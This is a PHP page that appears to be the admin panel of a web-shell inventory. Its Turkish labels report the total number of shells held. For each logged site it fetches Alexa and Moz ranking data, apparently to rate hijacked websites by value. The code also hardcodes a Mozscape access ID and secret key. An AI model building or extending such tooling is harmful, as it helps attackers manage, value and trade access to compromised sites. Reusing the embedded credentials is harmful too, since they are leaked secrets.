<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location:login');
} else {
?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//TR" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="tr">
    <head>
    	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    	<meta charset="UTF-8">
    	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    	<link rel="stylesheet" href="style.css">
    	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
    	<link rel="shortcut icon" type="png" href="cshn1/favicon.ico"/>
    	<title>>_</title>
    </head>

    <body>
<center>
  <ul>
       </ul>
 <?php 
 include 'cshn1/db.php';
  $sorgu = $db->prepare("SELECT COUNT(*) FROM links"); //shell
$sorgu->execute();
$say = $sorgu->fetchColumn();
?>
 <ul>
        <li><?php echo "TOPLAM $say ADET SHELL BULUNMAKTADIR";?></li>
        </ul>
 <?php
include 'cshn1/db.php';
$icerik = $db->query("select * from links group by log ORDER BY id ASC");
$icerik-> execute();
while($row = $icerik->fetch(PDO::FETCH_ASSOC)){
    $ip = $row['ip'];
    $tarih = $row['tarih'];
    $log = $row['log'];
 
$url = $ip;
  $alexa = simplexml_load_file('http://data.alexa.com/data?cli=10&url='.$url);
$globalsira = number_format( (int) $alexa->SD->POPULARITY['TEXT'] );
  $ulkeisim = $alexa->SD->COUNTRY['NAME'];
$ulkesira = number_format( (int) $alexa->SD->COUNTRY['RANK'] );
$urlToDA="google.com";

    
// you can obtain you access id and secret key here: http://www.seomoz.org/api/keys
   $accessID = 'mozscape-7a8db866a9';
    $secretKey = 'c840c414b0d8ab6cda9560843e80cd2';
 
// Set your expires for several minutes into the future.
// Values excessively far in the future will not be honored by the Mozscape API.
$expires = time() + 300;
 
// A new linefeed is necessary between your AccessID and Expires.
$stringToSign = $accessID."\n".$expires;
 
// Get the "raw" or binary output of the hmac hash.
$binarySignature = hash_hmac('sha1', $stringToSign, $secretKey, true);
 
// We need to base64-encode it and then url-encode that.
$urlSafeSignature = urlencode(base64_encode($binarySignature));
 
// This is the URL that we want link metrics for.
$objectURL = $ip;
 
// Add up all the bit flags you want returned.
// Learn more here: http://apiwiki.seomoz.org/categories/api-reference
$cols = "103079215140";
 
// Now put your entire request together.
// This example uses the Mozscape URL Metrics API.
$requestUrl = "http://lsapi.seomoz.com/linkscape/url-metrics/".urlencode($objectURL)."?Cols=".$cols."&AccessID=".$accessID."&Expires=".$expires."&Signature=".$urlSafeSignature;
 
// We can easily use Curl to send off our request.
$options = array(
    CURLOPT_RETURNTRANSFER => true
    );
 
$ch = curl_init($requestUrl);
curl_setopt_array($ch, $options);
$content = curl_exec($ch);
curl_close($ch);
 
// * Store URL metrics in array

$json_a = json_decode($content);

// * Assign URL metrics to separate variables
 $pa = round($json_a->upa,0);  
$da = round($json_a->pda,0);
   $theUrl = $json_a->uu;
 
   ?>
 
 <ul>
 </ul>
    
    <table id="personel">
<tr>
        <th>Site Adı</th>
        <th>Alexa Rank</th>
        <th>Ülke Adı </th>
        <th>Ülke Rankı </th>
                <th>Da </th>
        <th>Pa </th>
 
    </tr>
 

<tr>
        <td><?php echo strip_tags(trim(addslashes($ip)));?></td>
        <td><?php echo strip_tags(trim(addslashes($globalsira)));?></td>
        <td><?php echo strip_tags(trim(addslashes($ulkeisim)));?></td>
        <td><?php echo strip_tags(trim(addslashes($ulkesira)));?></td>
         <td><?php echo strip_tags(trim(addslashes($da)));?></td>
        <td><?php echo strip_tags(trim(addslashes($pa)));?></td>
 
</tr>
</table>


<?php } }  ?>	
 </div>
</div>
</center>
</body>
</html>
